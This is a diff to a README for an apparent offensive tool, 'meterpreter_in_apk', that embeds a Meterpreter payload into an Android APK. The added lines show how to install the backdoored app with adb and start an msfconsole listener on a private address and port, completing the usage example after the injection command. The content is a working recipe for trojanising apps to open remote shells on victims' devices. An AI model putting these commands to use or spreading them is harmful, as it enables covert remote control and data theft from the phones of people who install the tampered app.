@@ -28,5 +28,9 @@ Dependencies: pyp, fdfind, msfvenom, ripgrep, uber
 ## EXAMPLE
 ./meterpreter_in_apk.sh -H 192.168.244.44 -p 8844 -g path/to/app.apk
 
+adb install  app/dist/app-aligned-debugSigned.apk
+
+msfconsole -q -r msf_192.168.244.44_8844.rc
+
 ## OUTPUT
 ![Release header](https://github.com/wanbalan/meterpreter_in_apk/blob/main/screen_001.png?raw=true)
